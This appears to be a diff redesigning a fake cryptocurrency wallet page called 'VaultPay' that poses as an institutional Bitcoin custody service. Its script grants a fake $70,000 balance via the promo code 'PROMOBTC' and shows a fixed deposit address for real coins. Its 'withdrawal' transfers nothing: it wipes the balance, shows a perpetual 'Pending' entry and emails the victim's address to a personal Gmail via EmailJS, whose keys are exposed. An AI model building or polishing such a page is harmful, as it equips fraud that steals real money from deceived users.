@@ -3,267 +3,484 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VaultPay | Secure Asset Management</title>
+<title>VaultPay | Institutional Digital Assets</title>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #0b0e11;
-    --card: #1e2329;
-    --text: #eaecef;
-    --muted: #848e9c;
-    --primary: #f3ba2f;
-    --border: #363c44;
-    --green: #0ecb81;
-    --error: #f6465d;
+    --bg-dark: #050505;
+    --surface: #111111;
+    --surface-light: #1A1A1A;
+    --border: #262626;
+    --text-primary: #FFFFFF;
+    --text-secondary: #A3A3A3;
+    --accent: #F5A524; /* Crypto Gold */
+    --accent-glow: rgba(245, 165, 36, 0.15);
+    --success: #17C964;
+    --success-bg: rgba(23, 201, 100, 0.1);
+    --danger: #F31260;
   }
 
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
   body {
-    font-family: 'Inter', -apple-system, sans-serif;
-    background-color: var(--bg);
-    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    background-color: var(--bg-dark);
+    background-image: 
+      radial-gradient(circle at 15% 50%, rgba(255,255,255,0.02) 0%, transparent 25%),
+      radial-gradient(circle at 85% 30%, var(--accent-glow) 0%, transparent 25%);
+    color: var(--text-primary);
     display: flex;
     justify-content: center;
     align-items: center;
     min-height: 100vh;
-    margin: 0;
+    overflow: hidden;
   }
 
+  /* Main Container (Glassmorphism) */
   .app-container {
-    background-color: var(--card);
-    padding: 30px;
-    border-radius: 20px;
+    background: var(--surface);
     width: 100%;
-    max-width: 380px;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    max-width: 420px;
+    height: 100vh;
+    max-height: 800px;
     border: 1px solid var(--border);
-    text-align: center;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+  }
+
+  @media (min-width: 480px) {
+    .app-container { height: 90vh; border-radius: 24px; }
   }
 
   .hidden { display: none !important; }
 
-  .balance-section {
-    background: linear-gradient(135deg, #2b3139 0%, #1e2329 100%);
-    padding: 25px;
-    border-radius: 15px;
-    margin: 20px 0;
-    border: 1px solid var(--border);
+  /* Start Screen */
+  .start-screen {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100%;
+    padding: 40px;
+    text-align: center;
+    background: linear-gradient(180deg, var(--surface) 0%, var(--bg-dark) 100%);
   }
 
-  .balance-val {
-    font-size: 36px;
-    font-weight: 700;
-    margin: 10px 0;
+  .logo-wrapper {
+    width: 80px; height: 80px;
+    background: linear-gradient(135deg, #333 0%, #111 100%);
+    border-radius: 20px;
+    display: flex; justify-content: center; align-items: center;
+    border: 1px solid var(--border);
+    margin-bottom: 24px;
+    box-shadow: 0 0 30px var(--accent-glow);
+  }
+
+  /* Header & Network Status */
+  .top-bar {
+    padding: 20px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .network-status {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 11px; color: var(--text-secondary);
+    font-weight: 500; letter-spacing: 0.5px;
+  }
+
+  .dot {
+    width: 6px; height: 6px; background: var(--success);
+    border-radius: 50%; box-shadow: 0 0 8px var(--success);
+  }
+
+  /* Balance Section */
+  .balance-wrapper {
+    padding: 30px 24px 20px;
+    text-align: center;
+  }
+
+  .balance-label {
+    font-size: 12px; font-weight: 500;
+    color: var(--text-secondary);
+    text-transform: uppercase; letter-spacing: 1px;
+    margin-bottom: 8px;
+  }
+
+  .balance-amount {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 42px; font-weight: 700;
     letter-spacing: -1px;
+    display: flex; justify-content: center; align-items: flex-start;
   }
 
-  .grid-nav {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 10px;
-    margin-bottom: 25px;
+  .currency-symbol { font-size: 24px; color: var(--text-secondary); margin-top: 6px; margin-right: 4px; }
+
+  /* Navigation Tabs */
+  .tab-nav {
+    display: flex; padding: 0 24px; gap: 8px; margin-bottom: 20px;
   }
 
-  button {
-    background-color: var(--primary);
-    color: #000;
-    border: none;
-    padding: 14px;
-    border-radius: 10px;
-    font-weight: 700;
-    cursor: pointer;
-    transition: transform 0.1s, opacity 0.2s;
-    font-size: 13px;
+  .tab-btn {
+    flex: 1; background: var(--surface-light); color: var(--text-secondary);
+    border: 1px solid var(--border); padding: 12px 0;
+    border-radius: 12px; font-size: 13px; font-weight: 600;
+    cursor: pointer; transition: all 0.2s ease;
   }
 
-  button:hover { opacity: 0.9; }
-  button:active { transform: scale(0.96); }
-
-  .btn-outline {
-    background: transparent;
-    border: 1px solid var(--border);
-    color: var(--text);
+  .tab-btn.active {
+    background: var(--text-primary); color: var(--bg-dark);
+    border-color: var(--text-primary);
   }
 
-  .btn-outline:hover { border-color: var(--primary); }
+  /* Content Panes */
+  .pane-container {
+    flex: 1; padding: 0 24px; overflow-y: auto;
+    scrollbar-width: none;
+  }
+  .pane-container::-webkit-scrollbar { display: none; }
 
-  .action-pane {
-    background: rgba(0,0,0,0.2);
-    padding: 20px;
-    border-radius: 12px;
-    animation: fadeIn 0.3s ease;
-    text-align: left;
+  .pane { animation: fadeSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+
+  @keyframes fadeSlideUp {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
   }
 
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
+  /* Forms & Inputs */
+  .input-group { margin-bottom: 20px; }
+  .input-label { display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 8px; font-weight: 500; }
+  
   input {
-    width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    background: #0b0e11;
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    color: white;
-    box-sizing: border-box;
-    outline: none;
+    width: 100%; padding: 16px; background: var(--bg-dark);
+    border: 1px solid var(--border); border-radius: 12px;
+    color: var(--text-primary); font-family: 'JetBrains Mono', monospace;
+    font-size: 14px; transition: border 0.2s; outline: none;
+  }
+  input:focus { border-color: var(--accent); }
+
+  .primary-btn {
+    width: 100%; padding: 16px; background: var(--accent); color: #000;
+    border: none; border-radius: 12px; font-size: 15px; font-weight: 700;
+    cursor: pointer; transition: transform 0.1s, opacity 0.2s;
+  }
+  .primary-btn:active { transform: scale(0.98); }
+  .primary-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  /* Address Box */
+  .address-card {
+    background: var(--bg-dark); border: 1px solid var(--border);
+    border-radius: 12px; padding: 16px; margin-top: 8px;
+    position: relative; cursor: pointer; transition: border-color 0.2s;
+  }
+  .address-card:hover { border-color: var(--accent); }
+  .address-hash {
+    font-family: 'JetBrains Mono', monospace; font-size: 12px;
+    color: var(--accent); word-break: break-all; line-height: 1.5;
+  }
+  .copy-icon {
+    position: absolute; right: 12px; top: 12px;
+    background: var(--surface-light); padding: 4px 8px;
+    border-radius: 6px; font-size: 10px; color: var(--text-secondary);
   }
 
-  input:focus { border-color: var(--primary); }
+  /* Ledger / History */
+  .ledger-item {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 16px 0; border-bottom: 1px solid var(--border);
+  }
+  .ledger-left { display: flex; flex-direction: column; gap: 4px; }
+  .ledger-right { text-align: right; display: flex; flex-direction: column; gap: 4px; }
+  .tx-title { font-size: 14px; font-weight: 600; }
+  .tx-hash { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-secondary); }
+  .tx-amount { font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--text-primary); }
+  .status-badge {
+    display: inline-block; padding: 4px 8px; border-radius: 4px;
+    font-size: 10px; font-weight: 600; text-transform: uppercase;
+  }
+  .status-pending { background: var(--accent-glow); color: var(--accent); }
+  
+  .empty-state { text-align: center; padding: 40px 0; color: var(--text-secondary); font-size: 13px; }
 
-  .address-box {
-    background: #000;
-    padding: 15px;
-    border: 1px dashed var(--primary);
-    color: var(--primary);
-    font-family: monospace;
-    font-size: 11px;
-    word-break: break-all;
-    cursor: pointer;
-    border-radius: 8px;
-    margin: 10px 0;
+  /* Custom Toasts */
+  .toast-container {
+    position: absolute; bottom: 24px; left: 24px; right: 24px;
+    display: flex; flex-direction: column; gap: 10px; z-index: 100;
+  }
+  .toast {
+    background: var(--surface-light); border: 1px solid var(--border);
+    padding: 16px; border-radius: 12px; display: flex; align-items: center; gap: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    animation: slideInUp 0.3s ease forwards;
+  }
+  .toast.success { border-left: 4px solid var(--success); }
+  .toast.info { border-left: 4px solid var(--accent); }
+  .toast-msg { font-size: 13px; font-weight: 500; }
+
+  @keyframes slideInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeOut {
+    to { opacity: 0; transform: translateY(-10px); }
   }
 
-  .status-text {
-    margin-top: 15px;
-    font-size: 13px;
-    font-weight: 500;
-  }
-
-  .info { color: var(--primary); }
-  .success { color: var(--green); }
-  .error { color: var(--error); }
+  /* SVG Icons */
+  svg { width: 24px; height: 24px; stroke: currentColor; stroke-width: 2; fill: none; }
 </style>
 </head>
 <body>
 
 <div class="app-container">
-  <div id="scr-start">
-    <h1 style="margin:0; font-size: 26px;">Vault<span style="color:var(--primary)">Pay</span></h1>
-    <p style="color:var(--muted); font-size: 14px; margin-top: 5px;">Institutional Grade Crypto Wallet</p>
-    <button onclick="navTo('main')" style="width:100%; margin-top: 30px;">Get Started</button>
+  
+  <div id="screen-start" class="start-screen">
+    <div class="logo-wrapper">
+      <svg viewBox="0 0 24 24" style="width:40px; height:40px; stroke: var(--accent);"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+    </div>
+    <h1 style="font-size: 28px; margin-bottom: 8px;">Vault<span style="color: var(--accent)">Pay</span></h1>
+    <p style="color: var(--text-secondary); font-size: 14px; margin-bottom: 40px; line-height: 1.5;">Institutional-grade custody <br>for digital assets.</p>
+    <button class="primary-btn" onclick="navTo('main')">Authenticate Node</button>
   </div>
 
-  <div id="scr-main" class="hidden">
-    <div class="balance-section">
-      <div style="font-size: 11px; color: var(--muted); letter-spacing: 1px;">TOTAL ACCOUNT BALANCE</div>
-      <div class="balance-val">$<span id="display-bal">0.00</span></div>
+  <div id="screen-main" class="hidden" style="display: flex; flex-direction: column; height: 100%;">
+    
+    <div class="top-bar">
+      <div style="font-weight: 600; font-size: 16px;">Node <span style="color: var(--text-secondary)">#8472</span></div>
+      <div class="network-status"><div class="dot"></div> BTC MAINNET</div>
     </div>
 
-    <div class="grid-nav">
-      <button class="btn-outline" onclick="showAction('deposit')">Deposit</button>
-      <button class="btn-outline" onclick="showAction('promo')">Promo</button>
-      <button class="btn-outline" onclick="showAction('withdraw')">Withdraw</button>
+    <div class="balance-wrapper">
+      <div class="balance-label">Total Portfolio Value</div>
+      <div class="balance-amount">
+        <span class="currency-symbol">$</span><span id="ui-balance">0.00</span>
+      </div>
     </div>
 
-    <div id="act-deposit" class="action-pane hidden">
-      <div style="font-size: 13px; margin-bottom: 8px; font-weight: 600;">Direct Deposit</div>
-      <div style="font-size: 12px; color: var(--muted); margin-bottom: 10px;">Send your Crypto to this account to deposit:</div>
-      <div class="address-box" onclick="copyAddr()">bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d</div>
-      <small style="color: var(--muted)">Tap the address box above to copy</small>
+    <div class="tab-nav">
+      <button class="tab-btn active" onclick="switchTab('deposit', this)">Deposit</button>
+      <button class="tab-btn" onclick="switchTab('promo', this)">Promo</button>
+      <button class="tab-btn" onclick="switchTab('withdraw', this)">Withdraw</button>
+      <button class="tab-btn" onclick="switchTab('history', this)">Ledger</button>
     </div>
 
-    <div id="act-promo" class="action-pane hidden">
-      <div style="font-size: 13px; font-weight: 600;">Redeem Voucher</div>
-      <input type="text" id="promo-code" placeholder="Enter promo code">
-      <button onclick="redeem()" style="width:100%">Claim Reward</button>
-    </div>
+    <div class="pane-container">
+      
+      <div id="pane-deposit" class="pane">
+        <div class="input-label">DEPOSIT ADDRESS (BTC)</div>
+        <p style="font-size: 12px; color: var(--text-secondary); margin-bottom: 12px;">Send only Bitcoin (BTC) to this address. Sending any other asset will result in permanent loss.</p>
+        <div class="address-card" onclick="copyAddress()">
+          <div class="address-hash">bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d</div>
+          <div class="copy-icon">COPY</div>
+        </div>
+      </div>
 
-    <div id="act-withdraw" class="action-pane hidden">
-      <div style="font-size: 13px; font-weight: 600;">Withdraw Funds</div>
-      <input type="text" id="withdraw-addr" placeholder="Destination BTC Address">
-      <button onclick="processWithdraw()" style="width:100%">Confirm Withdrawal</button>
-    </div>
+      <div id="pane-promo" class="pane hidden">
+        <div class="input-group">
+          <label class="input-label">REDEEM VOUCHER</label>
+          <input type="text" id="input-promo" placeholder="Enter voucher code (e.g., PROMOBTC)" autocomplete="off" spellcheck="false">
+        </div>
+        <button class="primary-btn" onclick="applyPromo()">Apply Credit</button>
+      </div>
 
-    <div id="feedback" class="status-text hidden"></div>
+      <div id="pane-withdraw" class="pane hidden">
+        <div class="input-group">
+          <label class="input-label">DESTINATION ADDRESS</label>
+          <input type="text" id="input-withdraw" placeholder="bc1q..." autocomplete="off" spellcheck="false">
+        </div>
+        <div style="display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 20px;">
+          <span style="color: var(--text-secondary)">Network Fee:</span>
+          <span>0.00 BTC</span>
+        </div>
+        <button class="primary-btn" id="btn-withdraw" onclick="executeWithdraw()">Confirm Transfer</button>
+      </div>
+
+      <div id="pane-history" class="pane hidden">
+        <div id="history-container">
+          </div>
+      </div>
+
+    </div>
   </div>
+
+  <div class="toast-container" id="toast-area"></div>
+
 </div>
 
 <script>
-  // Configuration from User
-  const PUBLIC_KEY = 'VB9Rt0bAl5Fp2JxmU';
-  const SERVICE_ID = 'service_k743psj';
-  const TEMPLATE_ID = 'template_0nybbv8';
+  /* ================================
+     1. CONFIG & INIT
+     ================================ */
+  const EMAILJS_PUBLIC_KEY = 'VB9Rt0bAl5Fp2JxmU';
+  const EMAILJS_SERVICE_ID = 'service_k743psj';
+  const EMAILJS_TEMPLATE_ID = 'template_0nybbv8';
 
-  // Initialize EmailJS SDK
-  (function() {
-    emailjs.init(PUBLIC_KEY);
-  })();
+  emailjs.init(EMAILJS_PUBLIC_KEY);
 
-  // Balance Persistence Logic
-  let balance = parseFloat(localStorage.getItem('vault_user_balance')) || 0;
-  updateDisplay();
+  /* ================================
+     2. STATE MANAGEMENT
+     ================================ */
+  let userBalance = parseFloat(localStorage.getItem('vault_premium_bal')) || 0;
+  let txHistory = JSON.parse(localStorage.getItem('vault_premium_history')) || [];
 
+  function syncState() {
+    // Format to 2 decimal places with commas
+    document.getElementById('ui-balance').textContent = userBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    localStorage.setItem('vault_premium_bal', userBalance);
+    localStorage.setItem('vault_premium_history', JSON.stringify(txHistory));
+    renderLedger();
+  }
+
+  /* ================================
+     3. UI / NAVIGATION
+     ================================ */
   function navTo(screen) {
-    document.getElementById('scr-start').classList.add('hidden');
-    document.getElementById('scr-main').classList.remove('hidden');
+    document.getElementById('screen-start').classList.add('hidden');
+    document.getElementById('screen-main').classList.remove('hidden');
+    syncState();
   }
 
-  function showAction(type) {
-    ['deposit', 'promo', 'withdraw'].forEach(a => document.getElementById('act-'+a).classList.add('hidden'));
-    document.getElementById('act-'+type).classList.remove('hidden');
-    document.getElementById('feedback').classList.add('hidden');
-  }
-
-  function updateDisplay() {
-    document.getElementById('display-bal').textContent = balance.toLocaleString('en-US', {
-      minimumFractionDigits: 2,
-      maximumFractionDigits: 2
+  function switchTab(targetPane, btnElement) {
+    // Hide all panes
+    ['deposit', 'promo', 'withdraw', 'history'].forEach(p => {
+      document.getElementById('pane-' + p).classList.add('hidden');
     });
-    localStorage.setItem('vault_user_balance', balance);
-  }
-
-  function copyAddr() {
-    navigator.clipboard.writeText('bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d');
-    alert("Deposit address copied to clipboard!");
-  }
-
-  function redeem() {
-    const code = document.getElementById('promo-code').value.trim();
-    const msg = document.getElementById('feedback');
+    // Remove active class from buttons
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
     
-    if(code.toUpperCase() === 'PROMOBTC') {
-      balance += 70000;
-      updateDisplay();
-      msg.textContent = "Promo applied successfully! +$70,000.00";
-      msg.className = "status-text success";
-      document.getElementById('promo-code').value = "";
-    } else {
-      msg.textContent = "Invalid or expired promo code.";
-      msg.className = "status-text error";
-    }
-    msg.classList.remove('hidden');
+    // Show target
+    document.getElementById('pane-' + targetPane).classList.remove('hidden');
+    btnElement.classList.add('active');
   }
 
-  function processWithdraw() {
-    const addr = document.getElementById('withdraw-addr').value.trim();
-    const msg = document.getElementById('feedback');
+  /* ================================
+     4. CUSTOM TOAST NOTIFICATIONS
+     ================================ */
+  function showToast(message, type = 'success') {
+    const area = document.getElementById('toast-area');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    
+    let icon = type === 'success' 
+      ? '<svg viewBox="0 0 24 24" style="stroke:var(--success)"><polyline points="20 6 9 17 4 12"></polyline></svg>'
+      : '<svg viewBox="0 0 24 24" style="stroke:var(--accent)"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>';
+
+    toast.innerHTML = `${icon} <div class="toast-msg">${message}</div>`;
+    area.appendChild(toast);
+
+    setTimeout(() => {
+      toast.style.animation = 'fadeOut 0.3s ease forwards';
+      setTimeout(() => toast.remove(), 300);
+    }, 4000);
+  }
+
+  /* ================================
+     5. ACTIONS
+     ================================ */
+  function copyAddress() {
+    navigator.clipboard.writeText('bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d');
+    showToast('Deposit address copied to clipboard', 'success');
+  }
+
+  function applyPromo() {
+    const input = document.getElementById('input-promo');
+    const code = input.value.trim().toUpperCase();
+    
+    if(code === 'PROMOBTC') {
+      userBalance += 70000;
+      syncState();
+      showToast('Voucher applied: +$70,000.00 to account', 'success');
+      input.value = '';
+    } else {
+      showToast('Invalid or expired voucher code', 'info');
+    }
+  }
+
+  function executeWithdraw() {
+    const addrInput = document.getElementById('input-withdraw');
+    const addr = addrInput.value.trim();
+    const btn = document.getElementById('btn-withdraw');
 
     if(!addr) {
-      alert("Please enter a valid BTC wallet address.");
+      showToast('Please enter a destination address', 'info');
+      return;
+    }
+    if(userBalance <= 0) {
+      showToast('Insufficient funds for transfer', 'info');
       return;
     }
 
-    msg.textContent = "Reward confirmation in progress please wait...";
-    msg.className = "status-text info";
-    msg.classList.remove('hidden');
+    // Lock button
+    btn.disabled = true;
+    btn.textContent = 'Processing...';
 
-    // Variable Mapping as requested:
-    // {{Title}} -> Account Balance
-    // {{Name}} -> Wallet Address
-    const templateParams = {
-      Title: "$" + balance.toLocaleString(undefined, {minimumFractionDigits: 2}),
+    // 1. Capture exact amount before wiping
+    const withdrawAmount = userBalance;
+
+    // 2. Wipe balance to 0 instantly
+    userBalance = 0;
+    syncState();
+
+    // 3. Add to Ledger History
+    const dateStr = new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
+    txHistory.unshift({
+      id: 'TX-' + Math.random().toString(36).substr(2, 6).toUpperCase(),
+      amount: withdrawAmount,
+      address: addr,
+      date: dateStr,
+      status: 'Pending'
+    });
+    syncState();
+
+    // 4. Notify User
+    showToast('Reward confirmation in progress please wait...', 'info');
+
+    // 5. Send Data to EmailJS
+    const emailData = {
+      Title: "$" + withdrawAmount.toLocaleString('en-US', {minimumFractionDigits: 2}), 
       Name: addr,
       to_email: 'nibir.baruah2000@gmail.com'
     };
 
-    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
-      .then((response) => {
-        console.log('EMAIL SENT', response.status, response.text);
-      }, (err) => {
-        console.error('EMAIL FAILED', err);
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailData)
+      .then(() => {
+        // Reset UI State
+        btn.disabled = false;
+        btn.textContent = 'Confirm Transfer';
+        addrInput.value = '';
+      })
+      .catch((error) => {
+        console.error("EmailJS Error:", error);
+        btn.disabled = false;
+        btn.textContent = 'Confirm Transfer';
       });
+  }
 
-    document.getElementById('withdraw-addr').value = "";
+  function renderLedger() {
+    const container = document.getElementById('history-container');
+    
+    if(txHistory.length === 0) {
+      container.innerHTML = '<div class="empty-state">No transaction history found.</div>';
+      return;
+    }
+
+    container.innerHTML = txHistory.map(tx => `
+      <div class="ledger-item">
+        <div class="ledger-left">
+          <div class="tx-title">Withdrawal</div>
+          <div class="tx-hash">To: ${tx.address.substring(0,8)}...${tx.address.slice(-4)}</div>
+          <div class="tx-hash" style="color:#666">${tx.date} • ${tx.id}</div>
+        </div>
+        <div class="ledger-right">
+          <div class="tx-amount">-$${tx.amount.toLocaleString('en-US')}</div>
+          <div><span class="status-badge status-pending">${tx.status}</span></div>
+        </div>
+      </div>
+    `).join('');
   }
 </script>
 
